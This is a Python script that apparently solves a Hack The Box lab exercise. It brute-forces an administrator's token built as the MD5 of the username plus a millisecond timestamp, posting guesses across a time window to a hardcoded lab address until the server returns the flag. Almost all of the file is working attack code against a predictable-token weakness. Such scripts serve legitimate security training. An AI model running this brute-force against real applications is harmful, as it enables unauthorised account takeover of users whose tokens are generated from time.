import requests 
import re  
import hashlib
from datetime import datetime
import time 

url = "http://139.59.176.158:31810/question1/"

session = requests.Session()

# search the algorithm for token
def search_algo(usr_name, tok, gap):
	present_time = int(time.time()) * 1000

	for i in range(present_time - gap, present_time + gap):
		guess_str = (usr_name + str(i)).encode()
		guess_hash = hashlib.md5(guess_str).hexdigest()
		if tok == guess_hash:
			print("=========")
			print("= FOUND =")
			print(present_time - i)
			print("=========")
			return str(i)

# TESTIN ALGORITHM
username = "htbuser"
data = { "submit": username }
r = session.post(url, data = data)
token = re.findall(r"Your token is: (.*)</strong>", r.text)[0]
# time_stamp = search_algo(username, token, 400)


# FIND FOR ADMIN
username = "htbadmin"
present_time = int(time.time()) * 1000

# increase this gap if the answer is not found
gap = 500
print(present_time)
print(present_time + gap)
print("=====starting======")
for i in range(present_time - gap, present_time + gap):
	token_str = (username + str(i)).encode()
	token = hashlib.md5(token_str).hexdigest()
	data = {
		"token": token,
		"submit": "check"
	}
	r = session.post(url, data=data)
	result = re.findall(r'<div class="alert alert-warning"> <strong>(.*)</strong>', r.text)
	print(f"{i} <> {token} <> {result}")
	if len(result) == 0:
		answer = re.findall(r'Great work, your flag is (.*)</strong>', r.text)
		print("====================")
		print(answer[0])
		print("====================")
		break